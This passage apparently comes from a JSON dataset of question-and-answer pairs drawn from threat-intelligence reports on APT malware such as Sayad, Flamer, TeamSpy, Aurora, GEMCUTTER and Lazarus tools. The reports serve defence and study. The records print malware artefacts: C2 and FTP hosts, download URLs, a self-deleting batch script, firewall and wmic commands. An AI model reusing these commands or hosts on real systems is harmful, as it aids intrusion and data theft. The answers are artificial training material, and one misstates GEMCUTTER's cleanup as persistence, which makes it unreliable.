(SHA1:1c52b749403d3f229636f07b0040eb17beba28e4) was in fact a self extracting EXE that dropped and launched the Binder executable malware, ~8f60957b3689075fa093b047242c0255.exe (SHA1:69fd05ca3a7514ea79480d1dbb358fab391e738d). Once the Binder executable malware is launched, it checks the .NET version installed on the machine and drops the information stealer DLL component, Sayad (aka Client) \u2013 DiagnosticsService.dll (SHA1:8521eefbf7336df5c275c3da4b61c94062fafdda).\nSayad has some characteristics that make it unique:\nSayad has been designed by someone who seems to have a .NET OOP/OOD background\nIt uses some non-traditional methods for native to .NET interop like exporting a manged API through the native Export Address Table\nThe malware uses an oversimplified form of obfuscation for string utilizing Base64 encoding which in fact can be easily de-obfuscated\nOur collegues from NCC Group's Cyber Defence Operations published an article titled (<https://www.nccgroup.com/en/blog/2014/07/a-new-flying-kitten/>)\"A new Flying Kitten?\" with some details around Sayad malware and its possible link to the activities of the Iranian hacking group \"Ajax Security Team.\"\n\nHow does the Sayad malware leverage .NET framework capabilities to achieve its objectives? Describe the specific techniques it employs and why they might be considered unique.",
    "output": "A: The Sayad malware leverages the .NET framework in several unique ways to achieve its objectives. Firstly, it has been designed by someone with a strong background in .NET Object-Oriented Programming (OOP) and Object-Oriented Design (OOD), indicating a high level of expertise in the .NET ecosystem. One notable technique is the use of non-traditional methods for native to .NET interoperability, such as exporting a managed API through the native Export Address Table. This approach allows the malware to interact seamlessly between managed and unmanaged code, enhancing its flexibility and capability to execute various tasks. Additionally, Sayad employs an oversimplified form of string obfuscation using Base64 encoding, which, while not highly secure, serves to obscure the malware's intentions from casual inspection. These techniques collectively contribute to the malware's effectiveness and evasion capabilities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: Stolen Data\nCompromised clients upload stolen data to the entries directory. Files stored in this directory are encrypted with a public key stored in the database. These files cannot be decrypted without the corresponding private key. There was a file of 157,548 bytes still left on the server that the operators did not have the opportunity to download.\nThe stolen data is encrypted with this public key on the server, thus requiring the corresponding unknown private key to decrypt:\nBased on timestamps seen on the first server in the /newsforyou/bak directory we determined that the operators downloaded the stolen data on four separate dates in May.\nA total of around 75 MB of stolen data was found in the backups on one of the servers (server #1). Although the timing data is limited here, the timestamps of these backups suggest that the operators could be in the EMEA region. There was a four-day delay from the initial setup to when the operators began to retrieve stolen data. This is a possible indicator that the information about the new server had to take time to filter down to them.\nFigure 3.1\nMegabytes of stolen data by date, server #1\nIn comparison, the other server (server #2) saw a massive 5.7 GB of stolen data:\nFigure 3.2\nMegabytes of stolen data by date, server #2\nSmall Headline: Activity\nBy examining the files in the bak directories, specifically the number of files contained within the backup archives created each day, it is possible to obtain an indication of the activity of the C&C server, which can be seen in the chart below:\nFigure 4.1\nNumber of backup archives created each day, server #1\nNumber of backup archives created each day, server #2\nOn the first server, there is a clear increase in activity around May 20, which then drops off. This is to be expected as computers are cleared up.\nOn the second server the Flamer operation is in full flow and huge volumes of files are being created on the system.\nAnswer this question: Why did the W32.Flamer attackers encrypt the stolen data on the server, and what implications does this have for forensic investigations?",
    "output": "The W32.Flamer attackers encrypted the stolen data on the server using a public key stored in the database, requiring the corresponding private key to decrypt it. This encryption ensures that even if the server is compromised, the data remains secure and unreadable without the private key. For forensic investigations, this means that simply gaining access to the server does not provide immediate access to the stolen data. Investigators must either find the private key or use advanced cryptographic techniques to attempt decryption, significantly complicating the investigation process.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the key differences between IsSpace and its predecessor, the NFlog backdoor, particularly in terms of execution and data exfiltration?",
    "output": "IsSpace introduces several changes compared to NFlog. It writes log messages to 'C:\\\\ProgramData\\\\log[.]txt,' indicating it is designed to run on Microsoft Windows 7 or higher but can still operate on earlier systems. It uses a different event name ('MdQ0784kd') to ensure a single instance runs. IsSpace also includes the victim's user privilege level in the exfiltrated data and uses a campaign code ('303_20140401'). Additionally, it checks for internet connectivity by making an HTTP request to www.microsoft.com when running on Windows XP.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "THREAT ANALYSIS\nContinued Targeting of Indian Power Grid Assets by Chinese State-Sponsored Activity Group\nThis report details a campaign conducted by a likely Chinese state-sponsored threat activity group targeting the Indian power sector. The activity was identified through a combination of large-scale automated network traffic analytics and expert analysis. Data sources include the Recorded Future Platform, SecurityTrails, PolySwarm, Team Cymru's Pure Signal\u2122, and common open-source tools and techniques. The report will be of most interest to individuals engaged in strategic and operational intelligence relating to Indian and Chinese cyber activity. Recorded Future notified the appropriate Indian government departments prior to publication of the suspected intrusions to support incident response and remediation investigations within affected organizations. With thanks to our colleagues at Dragos for early sharing and collaboration.\nBig Headline: Executive Summary\nIn February 2021, Recorded Future's Insikt Group on intrusion activity targeting operational assets within India's power grid that we attributed to a likely Chinese state-sponsored threat activity group we track as RedEcho. Following a short lull after the publication of our RedEcho reporting, we have detected ongoing targeting of Indian power grid organizations by China-linked adversaries, frequently using the privately shared modular backdoor ShadowPad. ShadowPad continues to be employed by an -number of People's Liberation Army (PLA) and Ministry of State Security (MSS)-linked groups, with its origins to known MSS contractors first using the tool in their own operations and later likely acting as a digital quartermaster.\nDespite a partial troop disengagement between India and China from February 2021, the prolonged targeting of Indian critical infrastructure continues to raise concerns over prepositioning activity being conducted by Chinese adversaries. While this latest activity displays targeting and capability consistencies with previously identified RedEcho activity, there are also some notable distinctions. At this time, we have not identified technical evidence allowing us to attribute it to RedEcho, and we are currently clustering this latest activity under the temporary group name Threat Activity Group 38 (TAG38)1.\nBig Headline: Key Judgments\n\u2022 Given the continued targeting of State and Regional Load Despatch Centres in India over the past 18 months, first from RedEcho and now in this latest TAG-38 activity, this targeting is likely a long-term strategic priority for select Chinese state-sponsored threat actors active within India.\n\u2022 The prolonged targeting of Indian power grid assets by Chinese state-linked groups offers limited economic espionage or traditional intelligence-gathering opportunities. We believe this targeting is instead likely intended to enable information gathering surrounding critical infrastructure systems or is pre-positioning for future activity.\n\u2022 The objective for intrusions may include gaining an increased understanding into these complex systems in order to facilitate capability development for future use or gaining sufficient access across the system in preparation for future contingency operations.\nIn recent months, we observed likely network intrusions targeting at least 7 Indian State Load Despatch Centres (SLDCs) responsible for carrying out real-time operations for grid control and electricity dispatch within these respective states. Notably, this targeting has been geographically concentrated, with the identified SLDCs located in North India, in proximity to the disputed India-China border in Ladakh. One of these SLDCs was also targeted in previous RedEcho activity. This latest set of intrusions, however, is composed of an almost entirely different set of victim organizations. In addition to the targeting of power grid assets, we also identified the compromise of a national emergency response system and the Indian subsidiary of a multinational logistics company by the same threat activity\ngroup. To achieve this, the group likely compromised and co-1  Typically, Insikt Group publicly names a new threat activity group or campaign, opted internet-facing DVR/IP camera devices for command and such as RedFoxtrot, when analysts have data corresponding to at least 3 points on control (C2) of Shadowpad malware infections, as well as use of the Diamond Model of Intrusion Analysis with at least medium confidence. We will occasionally report on significant activity using a temporary activity clustering name the open source tool . such as TAG-38, where the activity is new and significant but doesn't map to existing groupings and hasn't yet graduated or merged into an established activity group.\n\nWhat are the strategic implications of the geographical concentration of recent intrusions targeting Indian State Load Despatch Centres (SLDCs) by TAG-38?",
    "output": "A: The recent intrusions targeting at least 7 Indian State Load Despatch Centres (SLDCs) have been geographically concentrated in North India, in proximity to the disputed India-China border in Ladakh. This suggests that the targeting is likely a long-term strategic priority for select Chinese state-sponsored threat actors active within India. The focus on these critical infrastructure assets raises concerns over prepositioning activity being conducted by Chinese adversaries, potentially to gain an advantage in future conflicts or negotiations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Extended McAfee product coverage details:\nMcAfee Web Gateway. TrustedSource has coverage for domains and IP addresses that the malware contacts. Coverage for associated malware was released January 15 (as \"BehavesLike.JS.Obfuscated.E\"). Proactive coverage existed for some components (as \"Trojan.Crypt.XDR.Gen\").\nMcAfee Application Control. All versions of McAfee Application Control protect against infection, without requiring updates, and will prevent all versions of the Aurora attack witnessed to date.\nMcAfee Firewall Enterprise. TrustedSource has coverage for domains and IP addresses that the malware contacts. The embedded McAfee anti-virus scanning engine in Firewall Enterprise Version 7.0.1.02 and later provides coverage for supported protocols via standard McAfee DAT updates. Coverage for known exploits and associated malware is provided as Exploit-Comele, Roarur.dr, and Roarur.dll in the 5862 DATs, released January 15.\nMcAfee SiteAdvisor, SiteAdvisor Plus, SiteAdvisor Enterprise. TrustedSource has coverage for domains and IP addresses that the malware contacts.\nMcAfee Email and Web Security Appliances. TrustedSource has coverage for domains and IP addresses that the malware contacts.\nBig Headline: Cleaning and Repair\nA full on-demand scan must run to completely clean an infected host. In some cases, it may also be necessary to run the on-demand scan in Safe Mode, as well as run a second scan after a reboot. It is critical that the on-demand scan be configured properly.\nThe proper configuration:\n\u2022 Scan All Local Drives\n\u2022 Memory for Rootkits\n\u2022 Running Processes\n\u2022 Registry\n\u2022 First \"Action\" set to \"Clean\"\nThe full, recommended process:\n\u2022 Launch a full on-demand scan with the prior-documented configuration\n\u2022 Allow the scan to run to completion\n\u2022 Reboot\n\u2022 Launch a second on-demand scan and allow it to run to completion to verify that the system has been cleaned\nQ: In the context of Operation Aurora, how does McAfee Application Control contribute to protecting against the Aurora attack, and what specific steps are required to ensure complete cleaning and repair of an infected host?",
    "output": "McAfee Application Control protects against the Aurora attack by preventing all versions of the attack witnessed to date, without requiring updates. To ensure complete cleaning and repair of an infected host, a full on-demand scan must be run with the following configuration: Scan All Local Drives, Memory for Rootkits, Running Processes, and Registry, with the first 'Action' set to 'Clean'. The recommended process involves launching a full on-demand scan with this configuration, allowing it to run to completion, rebooting the system, and then launching a second on-demand scan to verify that the system has been cleaned.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: BACKBEND\nBACKBEND is a secondary downloader used as a backup mechanism in the case the primary backdoor is removed. The BACKBEND sample af504e86416c5f643e96f6e5e69566f0 was compiled on 16 August 2007. When executed, BACKBEND checks for the presence of the mutexes MicrosoftZj or MicrosoftZjBak (both associated with BACKSPACE variants). If either of the mutexes exist, the malware exits.\nIf BACKBEND is not running from the C:\\Program Files\\Internet Explore folder as iexplore.exe, it creates the folder and copies itself as iexplore.exe to that location.\nNext, if the current execution path of the malware process is not <CSIDL_STARTUP>\\Update.exe, 53  it copies itself to that location to achieve persistence. Finally, BACKBEND starts the C:\\Program Files\\ Internet Explore\\iexplore.exe process by providing the current path of the malware as the first command line parameter.\nIf the malware process executable file path is C:\\Program Files\\Internet Explore\\iexplore.exe, BACKSPACE deletes the file given by the first command line parameter passed in. Then, the malware downloads a file from hxxp://www.cbkjdxf[.]com/04-1/04-1.htm and saves it under Windows directory as netsvc.exe. 54  BACKSPACE starts a new process using the full path of the downloaded file (%windir%\\netsvc.exe) and deletes <CSIDL_STARTUP>\\Update.exe.\nVery Small Headline: GEMCUTTER\nGEMCUTTER is used in a similar capacity as BACKBEND, but maintains persistence by creating a Windows registry run key.\nThe GEMCUTTER sample bf8616bbed6d804a3dea09b230c2ab0c was compiled on 15 February, 2009. The malware starts by creating MicrosoftGMMExit and MicrosoftGMMHaveExit as non-signaled events. GEMCUTTER then queries for the registry value HKEY_LOCAL_MACHINE\\Software\\Microsoft\\GetMM\\ pid. If the value does not exist, the malware sets the registry value to the encoded malware process filename (each filename character incremented by one).\nGEMCUTTER checks for the presence of the mutex MicrosoftGMMZJ to ensure only one copy of GEMCUTTER is executing. If the mutex doesn't exist, the malware creates it and continues execution; otherwise, the malware signals the MicrosoftGMMExit event.\nThe malware performs cleanup by deleting the registry value with the same name as the malware filename under the HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key and the file with the same name as the malware itself in the %sysdir% directory.\nIf GEMCUTTER is not running from %sysdir% as CTFM0N.xxx (the file extension is excluded in the check), the malware copies itself to that location. The malware then starts a new process by providing %sysdir%\\ CTFM0N.exe as the executable file path, and the current process exits.\nIf GEMCUTTER is running from %sysdir% as CTFM0N.xxx, the malware creates a new registry value under HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, with the value and data set to CTFM0N.EXE. The registry value HKEY_LOCAL_MACHINE\\Software\\Microsoft\\GetMM\\pid is set to the DUGN1O/fyf (CTFM0N.EXE with each character incremented by 1).\nGEMCUTTER checks for the existence of the mutex MicrosoftZj (associated with BACKSPACE). If the mutex doesn't exist, GEMCUTTER downloads a file from hxxp://www.lisword[.]com/HM/Update.htm and saves it under %windir% as netsvc.exe.  A new process is started using %windir%\\netsvc.exe55 as the executable file path.\nRead the text above and answer this question: Explain the mechanism by which the GEMCUTTER downloader, used by APT30, achieves persistence and prevents multiple instances of itself from running simultaneously. What specific actions does it take to ensure these objectives?",
    "output": "The GEMCUTTER downloader achieves persistence and prevents multiple instances from running simultaneously through several mechanisms. First, it creates two non-signaled events: 'MicrosoftGMMExit' and 'MicrosoftGMMHaveExit'. It then queries for the registry value 'HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\GetMM\\\\pid'. If this value does not exist, the malware sets it to the encoded malware process filename (each filename character incremented by one). To ensure only one instance runs, GEMCUTTER checks for the presence of the mutex 'MicrosoftGMMZJ'. If the mutex doesn't exist, the malware creates it and continues execution; otherwise, it signals the 'MicrosoftGMMExit' event. For persistence, GEMCUTTER deletes the registry value with the same name as the malware filename under 'HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' and the file with the same name as the malware itself in the '%sysdir%' directory. If GEMCUTTER is not running from '%sysdir%' as 'CTFM0N.xxx', it copies itself to that location and starts a new process using '%sysdir%\\\\CTFM0N.exe' as the executable file path, after which the current process exits. If it is running from '%sysdir%' as 'CTFM0N.xxx', it creates a new registry value under 'HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' with the value and data set to 'CTFM0N.EXE'. The registry value 'HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\GetMM\\\\pid' is set to 'DUGN1O/fyf' (CTFM0N.EXE with each character incremented by 1). Additionally, GEMCUTTER checks for the existence of the mutex 'MicrosoftZj' (associated with BACKSPACE). If the mutex doesn't exist, GEMCUTTER downloads a file from 'hxxp://www.lisword[.]com/HM/Update.htm', saves it under '%windir%' as 'netsvc.exe', and starts a new process using '%windir%\\\\netsvc.exe' as the executable file path.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: DllMain\nThe Module execution starts from the initialization procedure. First, the code searches for \"tv.cfg\" file in local directory and then common system paths, such as C:\\Windows, C:\\Windows\\System32.\nThe code uses non-standard way to pass some arguments to the called function. This is most likely done to harden manual analysis or break automated analysis of the code.\nNon-standard push of the \"tv.cfg\" string offset to the stack\nIf the tv.cfg file wasn't found the process exits. If it was found, the module gets unique system ID, which is a hashed value of system drive Volume Serial Number. To hash the Volume Serial Number two types of hash algorithms are used: custom SHL/SHR/OR-based algorithm and then MD5. The result is stored in a hex-string which is used as a decryption key for the tv.cfg and part of the code in current file. Alternatively a hash of 792 bytes of executable code from TeamViewer.exe is used for tv.cfg decryption.\nAfter that the module decrypts tv.cfg using RC4 algorithm. An example of decrypted tv.cfg is presented below:\nszUserAgent \"Mozilla5.0\"\nszadminstat \"tv/getinfo.php\"\nszadminhost \"newslite.org\"\nszfilehost \"\"\nnTimeOut \"10000\"\nnStartIdleTime \"60\"\nnregKey \"\" szSubKey \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"\nszValueName \"svchost\"\nszteampass \"1234\"\nnVideo \"4\"\nszlogftp \"bannetwork.org\"\nszusername \"[removed]\"\nszpassword \"[removed]\"\nszlogkey \"sysenter\"\nszlogstat \"log.php\"\nszpostdata \"id=\"\nnkilltvwin7 \"\"\nnkilltvwinXp \"\"\nnfakedel \"1\"\nAfter decrypting the config, the module checks if \"szadminhost\" is found inside. If it is not there, the executions stops.\nThen the module decrypts string data and extra code from its own data and code section. The data is stored in TLS section of the parent process.\nAfter using some of the file parts, the module overwrites them with 0-byte values to change the module in memory and possibly avoid detection or dumping of the module. This is the end of initialization part.\nNext, it starts main procedure, which loads export functions from the real avicap32.dll located in system directory (C:\\Windows\\System32\\). It also gets current Windows OS version and creates autorun key, under value specified in the tv.cfg. Currently it is\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost\nThen the module patches the hosting TeamViewer process. It intercepts calls to the following system API functions:\nadvapi32.dll: RegCreateKeyExW\nadvapi32.dll: RegQueryValueExW\nkernel32.dll: CreateProcessW\nkernel32.dll: CreateMutexA\nkernel32.dll: CreateFileW\nkernel32.dll: CreateDirectoryW\nkernel32.dll: DeleteFileW\nshell32.dll: ShellExecuteExW\nuser32.dll: SendMessageW\nuser32.dll: CreateDialogParamW\nuser32.dll: GetClassInfoExW\nuser32.dll: RegisterClassExW\nuser32.dll: CreateWindowExW\nuser32.dll: IsWindowVisible\nuser32.dll: GetDlgItem\nuser32.dll: ShowWindow\nuser32.dll: SetWindowTextW\nuser32.dll: MessageBoxW\nwintrust.dll: WinVerifyTrust\nOne of the functions, SetWindowTextW, is quite interesting and contains extra code to work with C2. This functions when it is executed the first time has a trigger to start a couple of new threads that communicate with C2 server to ping it and get commands via HTTP GET request using parameters specified in tv.cfg:\nhttp://<server>/tv/getinfo.php?id=...&pwd=...&stat=1\nThe server is expected to answer with one of the command from the list below:\nNext, it creates a Windows Firewall rule to allow outgoing connections for the current process, by running: \"netsh firewall set allowedprogram <Path to the TeamViewer executable> tv\"\nAfter that the module creates several threads, described below and proceeds to the second stage.\nIn the second stage the module loads \"kl.dll\" library from the current directory and imports two functions: \"Init\" and \"Rdp\".\nAfter that it calls \"Init\" function, waits 32 milliseconds allowing kl.dll to initialize and calls \"Rdp\" function from the same library. The result of that call is submitted to the C2 via HTTP Post with Content-Type: application/x-www-form-urlencoded header value.\nIn parallel a new thread is created, which waits for a signal to search *.bin files in the module directory, encrypt with szlogkey value from tv.cfg using RC4 algorithm and upload to the FTP server specified in the tv.cfg. After uploading the files are deleted from the filesystem using simple DeleteFileA API call.\nBig Headline: Thread #1 (bot updater):\nLocates current process main executable and checks file version and file attributes. If the file version, stored in the file version info section is not equal to \"6.0.10722.0\" the process terminates. If the attributes do not contain Hidden, System, then the attributes are set (Hidden and System) for the file and the process is restarted. After that it will connect to the Command and Control (C2) server and fetch updated modules\nby the following URLs:\nhttp://<server name>/<filename>, where\n<server name> is a value from tv.cfg file (newslite.org).\n<filename> is one of the values from the ebedded encrypted string list:\n\u25cf TeamViewer_Desktop.exe\n\u25cf TeamViewer_Resource_ru.dll\n\u25cf tv_w32.dll\n\u25cf tv_x64.dll\nBig Headline: Thread #2 (self-removal):\nThis thread creates a subthread which waits for a special event. If other thread fires the event, the current thread goes through a list of embedded filenames, which includes\nkl.dll, avicap32.dll, tv.cfg and changes file attributes to Hidden and System (which removes ReadOnly if set). After that, the module deletes the following registry keys:\n(HKLM or HKCU)\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost\nHKCU\\Software\\TeamViewer\\Version6\\MachineFallback\nHKCU\\Software\\TeamViewer\\Version6\nHKCU\\Software\\TeamViewer\nAfter that the thread creates and executes a batch file named \"1.bat\" with the following contents:\n@echo off&chcp 1251>nul\n:try\ntimeout /t 5\nattrib -h -s -a -r <Current Executable>\ndel <Current Executable>\nif exist <Current Executable> goto try\nattrib -h -s -a -r <tv.cfg Full Path>\ndel <tv.cfg Full Path>\nif exist <tv.cfg Full Path> goto try\nattrib -h -s -a -r <TeamViewer_Desktop.exe Full Path>\ndel <TeamViewer_Desktop.exe Full Path>\nif exist <TeamViewer_Desktop.exe Full Path> goto try\nattrib -h -s -a -r <tv_w32.exe Full Path>\ndel <tv_w32.exe Full Path>\nif exist <tv_w32.exe Full Path> goto try\nattrib -h -s -a -r <tv_x64.exe Full Path>\ndel <tv_x64.exe Full Path>\nif exist <tv_x64.exe Full Path> goto try\nattrib -h -s -a -r <tv_w32.dll Full Path>\ndel <tv_w32.dll Full Path>\nif exist <tv_w32.dll Full Path> goto try\nattrib -h -s -a -r <tv_x64.dll Full Path>\ndel <tv_x64.dll Full Path>\nif exist <tv_x64.dll Full Path> goto try\nattrib -h -s -a -r <kl.dll Full Path>\ndel <kl.dll Full Path>\nif exist <kl.dll Full Path> goto try\nattrib -h -s -a -r <1.bat Full Path>\ndel <1.bat Full Path>\nif exist <1.bat Full Path> goto try\nBig Headline: Thread #3 (watchdog):\nThis thread simply monitors creation of dangerous processes, such as taskmg.exe or procexp.exe. If it finds any of these processes running, it immediately terminates three processes (which ids are stored in current module memory) and current process. This is done in a never-ending loop with high priority \u2013 sleep time between check iterations is 1 millisecond. The algorithm designed to have different process termination procedures for Windows NT 5.x and Windows NT 6.x, however currently it simply calls ExitProcess API function.\nBig Headline: Main\nThe module concatenates a string to run a command with cmd.exe:\ncmd.exe /c wmic os get /format:HFORM > %SYSTEMDRIVE%\\ProgramData\\Adobe\\AdobeArm\\sysdll155.html\n&& wmic bios list /format:HFORM >> %SYSTEMDRIVE%\\ProgramData\\Adobe\\AdobeArm\\sysdll155.html\nExecution of the commands above concatenates two HTML reports which contain two tables with information about running OS and computer's BIOS. The attackers retrieve the following properties:\nOperation System properties:\n\u25cf BootDevice\n\u25cf BuildNumber\n\u25cf BuildType\n\u25cf Caption\n\u25cf CodeSet\n\u25cf CountryCode\n\u25cf CreationClassName\n\u25cf CSCreationClassName\n\u25cf CSDVersion\n\u25cf CSName\n\u25cf CurrentTimeZone\n\u25cf DataExecutionPrevention_32BitApplications\n\u25cf DataExecutionPrevention_Available\n\u25cf DataExecutionPrevention_Drivers\n\u25cf DataExecutionPrevention_SupportPolicy\n\u25cf Debug\n\u25cf Description\n\u25cf Distributed\n\u25cf EncryptionLevel\n\u25cf ForegroundApplicationBoost\n\u25cf FreePhysicalMemory\n\u25cf FreeSpaceInPagingFiles\n\u25cf FreeVirtualMemory\n\u25cf InstallDate\n\u25cf LargeSystemCache\n\u25cf LastBootUpTime\n\u25cf LocalDateTime\n\u25cf Locale\n\u25cf Manufacturer\n\u25cf MaxNumberOfProcesses\n\u25cf MaxProcessMemorySize\n\u25cf Name\n\u25cf NumberOfLicensedUsers\n\u25cf NumberOfProcesses\n\u25cf NumberOfUsers\n\u25cf Organization\n\u25cf OSLanguage\n\u25cf OSProductSuite\n\u25cf OSType\n\u25cf OtherTypeDescription\n\u25cf PlusProductID\n\u25cf PlusVersionNumber\n\u25cf Primary\n\u25cf ProductType\n\u25cf QuantumLength\n\u25cf QuantumType\n\u25cf RegisteredUser\n\u25cf SerialNumber\n\u25cf ServicePackMajorVersion\n\u25cf ServicePackMinorVersion\n\u25cf SizeStoredInPagingFiles\n\u25cf Status\n\u25cf SuiteMask\n\u25cf SystemDevice\n\u25cf SystemDirectory\n\u25cf SystemDrive\n\u25cf TotalSwapSpaceSize\n\u25cf TotalVirtualMemorySize\n\u25cf TotalVisibleMemorySize\n\u25cf Version\n\u25cf WindowsDirectory\nBIOS properties:\n\u25cf BiosCharacteristics\n\u25cf BuildNumber\n\u25cf CodeSet\n\u25cf CurrentLanguage\n\u25cf Description\n\u25cf IdentificationCode\n\u25cf InstallableLanguages\n\u25cf InstallDate\n\u25cf LanguageEdition\n\u25cf ListOfLanguages\n\u25cf Manufacturer\n\u25cf Name\n\u25cf OtherTargetOS\n\u25cf PrimaryBIOS\n\u25cf ReleaseDate\n\u25cf SerialNumber\n\u25cf SMBIOSBIOSVersion\n\u25cf SMBIOSMajorVersion\n\u25cf SMBIOSMinorVersion\n\u25cf SMBIOSPresent\n\u25cf SoftwareElementID\n\u25cf SoftwareElementState\n\u25cf Status\n\u25cf TargetOperatingSystem\n\u25cf Version\nAfter getting this information the module self-deletes by calling cmd.exe /c del <ModulePath>.\n\nQ: How does the TeamSpy crew generate a unique system ID for decrypting the 'tv.cfg' file and parts of the code? Describe the process and the algorithms used.",
    "output": "A: The TeamSpy crew generates a unique system ID by hashing the system drive Volume Serial Number. This process involves two types of hash algorithms: a custom SHL/SHR/OR-based algorithm followed by MD5. The resulting hash is stored in a hex-string, which is then used as a decryption key for the 'tv.cfg' file and parts of the code in the current file. Alternatively, a hash of 792 bytes of executable code from TeamViewer.exe can also be used for 'tv.cfg' decryption.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: COMMAND AND CONTROL\nThe payload communicates with its command and control server over port 443. The source port is randomly selected. While outbound traffic appears to be HTTPS, the actual traffi c uses a weak custom encryption scheme. The command and control packets have a very specifi c format.iv\nThe payload section is encrypted with a key selected by using GetTickCount. This means each infected node has its own key. The key is embedded in the header of the packet, and is easily recovered.\nMedium Headline: HOW THE MALWARE WORKS\nThe primary control logic can be found in the module registered under the service key (rasmon.dll, etc.). This module has been written in c and includes several specifi c methods and encodings that provide forensic track-ability.\nThe above screenshot illustrates a REcon\u2122 trace on the malware dropper and subsequent service creation. Location A. represents the dropper program, which unpacks itself and decompresses a file to the system32 directory. Point B. represents the initial svchost.exe startup, which is loading the malware payload. Location C. is the actual execution of the malware service, which remains persistent. At points E. and F. you can see the malware checking in with the command and control server. Finally, location D. represents the dissolvable batch file which deletes the initial dropper and then itself.\nAnswer this question: In the Aurora malware operation, how does the payload communicate with its command and control server, and what encryption scheme is used? Additionally, explain the significance of the key selection process.",
    "output": "In the Aurora malware operation, the payload communicates with its command and control server over port 443. The source port is randomly selected. While outbound traffic appears to be HTTPS, the actual traffic uses a weak custom encryption scheme. The command and control packets have a very specific format. The payload section is encrypted with a key selected by using GetTickCount, meaning each infected node has its own key. The key is embedded in the header of the packet and is easily recovered. This key selection process is significant because it allows for unique encryption keys for each infected node, making it harder to decrypt the communication without knowing the specific key, but also provides an avenue for forensic analysis as the key can be recovered from the packet header.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 3.4  Links to Previous Reporting\nSome of the malware variants identified during Operation Blockbuster have been correlated to previously reported incidents and attacks, either because the malware was specifically identified in the attack, the Lazarus Group malware shared notable code overlap with the publicly reported malware, or the C2 infrastructure publicly reported was also found hard coded in malicious tools used by the Lazarus Group. Additionally, several events also had TTPs highly similar to those of the Lazarus Group and have been linked to other notable attacks by security researchers. While some of these indicators, such as overlapping C2s or some TTPs, may not be definitive proof of a linked activity, the collective picture of these events together provide a stronger link.\nThese ties strongly suggest that the Lazarus Group has been active since at least 2009, and potentially as far back as 2007, or has extensively shared resources with other closely linked groups responsible for these attacks. In the scenario that the GOP were a real organization and responsible for the SPE attack, this would suggest that SPE was not the only operation by the hacktivist group. However, Novetta's analysis and findings suggest that the SPE attack was one of several attacks attributable to the Lazarus Group, who may have posed as the pop up hacktivist collective to mislead or distract the public.\nThe Lazarus Group Timeline\nVarious security researchers have connected multi-staged attacks over a period of several years, largely against South Korean targets. Attack methods used include hard disk wiping and DDoS attacks that triggered on historically significant dates, overwriting disk content with political strings, using legitimate third-party update mechanisms to move across target networks, specific encryption and obfuscation methods, and using similar C2 structures across campaigns. We have been able to directly link several of these attacks to the Lazarus Group.\nOperation Flame and Operation 1Mission: 2007 \u2013 2012\nIssueMakersLab researchers have connected malicious activity as recent as the March 2013 DarkSeoul wiper attack to activity as far back as 2007,36 as the attackers used the same passwords, RSA encryption keys, and C2 protocol across attacks.37 Since 2012, these attackers have reportedly carried out activities under the name \"Operation 1Mission,\" based on a PDB path found in a plurality of the malware linked to identified attack activity.\nThe group behind Operation 1Mission used legitimate third-party software (an ActiveX vulnerability) as an initial infection vector, shared public RSA key across malware variants for six years, exfiltrated data and downloaded additional malware using Stage 1 C2 servers using the same primary C2 protocol and C2 code, and distributed destructive malware via Stage 2 C2 servers using altered antivirus update files. The Operation 1Mission TTPs have been reflected in multiple reported events listed in this section as well as in the Lazarus Group's malware: although we cannot confirm a link to the malware used in Operation 1Mission, Novetta has also observed shared public RSA keys across malware families, shared C2 infrastructure between unrelated families, and Stage 1 C2 servers used to distribute and download additional malware tools.\nIssueMakerLabs' analysis linking DarkSeoul to malicious activity from 2007 has also been supported by Fortinet research, which connected cyber activity from 2007, dubbed Operation Flame,38 to Operation 1Mission, Operation Troy, and the DarkSeoul attack. While the earliest compilation date for Lazarus Group malware identified by Novetta during this Operation is 2009, Novetta has directly linked Lazarus Group tools to Operation Troy and at least two other attacks that\n34  \"South Korea Detects Suspected North Korea Hacking Attempt.\" Security Week. March 27, 2014. http://www.securityweek.com/south-korea-detects-suspected-north-korea-hacking-attempt\n35  \"S. Korean military research agency kept mum about hacking.\" The Dong-A Ilbo. April 11, 2014. http://english.donga.com/List/3/all/26/408162/1\n36  \"South Korea identified who's behind the cyber attack.\" IssueMakersLabs. https://docs.google.com/file/d/0B6CK-ZBGuMe4dGVHdTZnenJMRUk/edit?pli=1\n37  \"[\ub2e8\ub3c5] 3.20 \uc0ac\uc774\ubc84\ud14c\ub7ec \uacf5\uaca9\uc8fc\uccb4, \uadf8 \uc2e4\uccb4 \ub4dc\ub7ec\ub098\ub2e4(The 3.20 cyber terrorism subject, the realities emerge)!\" boannews.com April 9, 2013. http://www.boannews.com/media/view.asp?idx=35578\n38  \"Z:\\Make Troy\\, Not War: Case Study of the Wiper APT in Korea, and Beyond.\" Fortinet. 2014. https://www.blackhat.com/docs/asia-14/materials/Yang/Asia-14-Yang-Z-Make-Troy-Not-War-Case-Study-Of-The-Wiper-APT-In-Korea-And-Beyond.pdf\nCHAPTER\nFour\n\nAnswer this question based on the above context: How did the Lazarus Group leverage legitimate third-party software in their attacks, and what implications does this have for cybersecurity strategies?",
